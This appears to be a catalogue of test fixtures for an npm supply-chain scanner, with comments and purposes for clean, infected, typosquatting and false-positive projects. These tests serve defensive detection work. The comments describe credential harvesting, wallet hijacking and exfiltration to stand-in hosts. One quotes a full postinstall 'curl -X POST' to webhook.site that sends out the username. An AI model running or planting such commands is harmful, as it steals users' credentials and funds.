test_cases.name: clean-project
test_cases.description: Should show no issues - clean project with no compromised packages

files.comment: Clean package.json with legitimate dependencies (react, lodash, color). No suspicious packages or patterns.
files.purpose: Defines a clean project without security risks as baseline for tests.

test_cases.name: infected-project
test_cases.description: Should show multiple issues - contains malicious webhook references and suspicious patterns

files.comment: Contains known compromised packages: @ctrl/tinycolor@4.1.0, @ctrl/deluge@1.2.0, @nativescript-community/ui-material-core@7.2.49
files.purpose: Simulates a project with known compromised NPM packages.

files.comment: Contains webhook.site reference for data exfiltration. Clearly marked as test file for content detection.
files.purpose: Tests detection of webhook.site URLs as exfiltration endpoints.

files.comment: Implements wallet hijacking through window.ethereum manipulation and XMLHttpRequest interception. Redirects to attacker wallet 0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976.
files.purpose: Simulates cryptocurrency theft malware with wallet manipulation.

files.comment: Collects credentials from environment variables and files (~/.aws/credentials, ~/.ssh/id_rsa). Exfiltrates data via webhook.site. Very suspicious functions like harvestCredentials() and exfiltrateData().
files.purpose: Tests detection of credential harvesting malware.

files.comment: Package.json with highly suspicious postinstall script: 'curl -X POST https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 -d $(whoami)' - exfiltrates username via webhook.site immediately after installation.
files.purpose: Tests detection of malicious npm lifecycle scripts that steal data immediately after installation.

files.comment: Shell script that executes TruffleHog and searches environment variables for AWS_ACCESS_KEY, GITHUB_TOKEN, NPM_TOKEN. Ambivalent: could be security scanning or credential harvesting. Contains both grep commands and process.env references.
files.purpose: Tests distinction between legitimate security scanning and potential credential harvesting.

files.comment: Definitely malicious TruffleHog wrapper: downloads TruffleHog, scans system-wide for secrets (/home/, /Users/), extracts AWS/GitHub/NPM tokens from results and exfiltrates them via curl to webhook.site. Subsequently deletes evidence (/tmp/secrets.json).
files.purpose: Clearly malicious TruffleHog abuse for automated credential theft.

files.comment: GitHub Actions workflow with malicious payload: contains curl command that sends data to webhook.site. Disguised as 'Test malicious workflow file' but performs actual data exfiltration.
files.purpose: Tests detection of malicious GitHub Actions that abuse CI/CD for data theft.

test_cases.name: chalk-debug-attack
test_cases.description: Should show HIGH risk - contains compromised chalk and debug packages with crypto theft patterns

files.comment: Contains compromised versions of the chalk/debug attack from September 8, 2025: chalk@5.6.1, debug@4.4.2, ansi-styles@6.2.2
files.purpose: Reproduces the known chalk/debug supply-chain attack.

files.comment: Implementation of the actual chalk/debug attack with XMLHttpRequest hijacking, wallet replacement and contact to npmjs.help. Contains obfuscated code (_0x19ca67) and wallet addresses.
files.purpose: Exact replica of the real malware from the chalk/debug attack.

files.comment: Highly obfuscated payload using javascript-obfuscator. Contains wallet hijacking (_0x4f2a array with 'ethereum', 'wallet'), replaces ETH transactions with attacker wallet 0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976, and exfiltrates localStorage to npmjs.help.
files.purpose: Tests detection of heavily obfuscated malicious code with disguised function names.

test_cases.name: network-exfiltration-project
test_cases.description: Should show HIGH risk - contains malicious webhook.site references and exfiltration patterns

files.comment: Standard package.json, suspicious only in project context.
files.purpose: Baseline for network exfiltration scenario.

files.comment: Multiple exfiltration patterns: hardcoded IPs (192.168.1.100), webhook.site, Base64-encoded URLs, WebSocket connections to evil.example.com, credential exfiltration from localStorage. Contains specific network indicators and encoding patterns.
files.purpose: Tests various network-based exfiltration techniques with specific IP and encoding indicators.

test_cases.name: legitimate-crypto
test_cases.description: Should show MEDIUM risk only - legitimate cryptocurrency libraries that may trigger crypto theft patterns

files.comment: Legitimate crypto libraries (ethers, web3, bitcoin-core) that may trigger medium-risk warnings.
files.purpose: Tests false positive detection with legitimate crypto tools.

files.comment: Legitimate wallet utilities with proper use of ethers.js. Contains example Ethereum address for documentation which triggers crypto pattern detection.
files.purpose: Example of legitimate cryptocurrency handling with expected crypto warnings.

files.comment: Legitimate HTTP client for crypto APIs without suspicious patterns.
files.purpose: Standard HTTP client for crypto services.

test_cases.name: common-crypto-libs
test_cases.description: Should not trigger HIGH risk false positives - common crypto libraries that should only show medium risk for crypto usage patterns

files.comment: Commonly used crypto libraries that should not be detected as HIGH-risk false positives.
files.purpose: Prevents false positives with standard crypto libraries.

files.comment: Normal use of ethers.js library but contains Ethereum addresses that trigger crypto pattern detection.
files.purpose: Shows legitimate ethers.js implementation with expected crypto pattern warnings.

files.comment: Standard HTTP requests for crypto APIs.
files.purpose: Normal HTTP communication with crypto services.

test_cases.name: typosquatting-project
test_cases.description: Should show MEDIUM risk - contains typosquatting packages

files.comment: Contains specific typosquatting packages: 'raect' instead of 'react', 'lodsh' instead of 'lodash', 'expres' instead of 'express', '@typеs/node' with Cyrillic 'е'.
files.purpose: Tests detection of typosquatting attacks with specific character omissions and unicode substitutions.

test_cases.name: comprehensive-test
test_cases.description: Should show MEDIUM risk - contains typosquatting packages and suspicious network patterns

files.comment: Comprehensive test with various suspicious packages including typosquatting: 'reаct' with Cyrillic 'а', 'lodsh' missing 'a', '@typescript_eslinter/eslint' namespace typosquat.
files.purpose: Combines different threat types including typosquatting in one test.

files.comment: Comprehensive malicious patterns: data exfiltration via pastebin.com with Base64-encoded cookies, WebSocket connection to c2-server.evil.com, hardcoded private IP (10.0.1.50:9999/backdoor), Base64-decoded URL (evil.com/steal). Contains specific Base64 payload 'aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA==' and btoa(document.cookie) exfiltration.
files.purpose: Combines multiple high-risk exfiltration techniques with specific indicators for precise detection testing.

test_cases.name: mixed-project
test_cases.description: Should show medium risk issues - contains suspicious webhook usage but not definitive compromise

files.comment: Mixed project with partially suspicious elements.
files.purpose: Tests detection of medium-risk scenarios.

files.comment: Contains webhook.site reference but with different endpoint ('some-other-endpoint'). Could be legitimate (webhook integration) or suspicious (data exfiltration). Ambivalent patterns require medium-risk classification.
files.purpose: Tests detection of borderline webhook.site usage that is not clearly malicious.

test_cases.name: semver-matching
test_cases.description: Should show MEDIUM risk for packages that could match compromised versions - semver ranges that include compromised versions

files.comment: Semver ranges that could include compromised versions: @operato/board@~9.0.35, @ctrl/tinycolor@^4.0.0
files.purpose: Tests detection of semver ranges that could contain compromised versions.

test_cases.name: namespace-warning
test_cases.description: Should show LOW risk namespace warnings only - packages from affected namespaces but safe versions

files.comment: Packages from affected namespaces but in safe versions, should only generate LOW-risk warnings.
files.purpose: Tests namespace warnings without acute threat.

test_cases.name: debug-js
test_cases.description: Should show MEDIUM risk - contains debug package that may trigger crypto theft patterns

files.comment: Contains debug package that may trigger medium-risk crypto theft patterns.
files.purpose: Tests specific detection of debug package in context of chalk/debug attack.

test_cases.name: legitimate-security-project
test_cases.description: Should show MEDIUM risk - legitimate security tool using TruffleHog

files.comment: Package.json for legitimate security project.
files.purpose: Baseline for legitimate security scanning project.

files.comment: Legitimate Python security scanner script that uses TruffleHog. Collects environment variables and scans for secrets, but for legitimate security audits. Contains comments explicitly indicating legitimate purpose ('Legitimate security scanner', 'proper security tool, not malware').
files.purpose: Distinction between legitimate security scanning and malicious credential harvesting.

test_cases.name: false-positive-project
test_cases.description: Should show minimal LOW risk warnings only - legitimate code with expected low-level pattern matches

files.comment: Legitimate Express.js server that uses environment variables. Contains AWS config and JWT secrets from ENV which triggers low-level credential scanning patterns, but this is normal practice.
files.purpose: Tests that normal ENV usage triggers appropriate low-level warnings without false HIGH-risk alerts.

files.comment: Standard Vue.js component without suspicious patterns.
files.purpose: Normal frontend component as false positive test.

files.comment: Standard webpack configuration without suspicious elements.
files.purpose: Build tool configuration that should not trigger warnings.

test_cases.name: edge-case-project
test_cases.description: Should show LOW risk - documentation mentions credentials but is legitimate

files.comment: Documentation that mentions credentials (AWS_ACCESS_KEY, GITHUB_TOKEN) but as legitimate instructions, not as malware. Should only trigger LOW-risk due to mention of sensitive terms.
files.purpose: Tests distinction between malicious code and legitimate documentation.

files.comment: pnpm-lock.yaml with @ctrl/tinycolor@4.1.2 - if this is a compromised version, HIGH-risk should be detected.
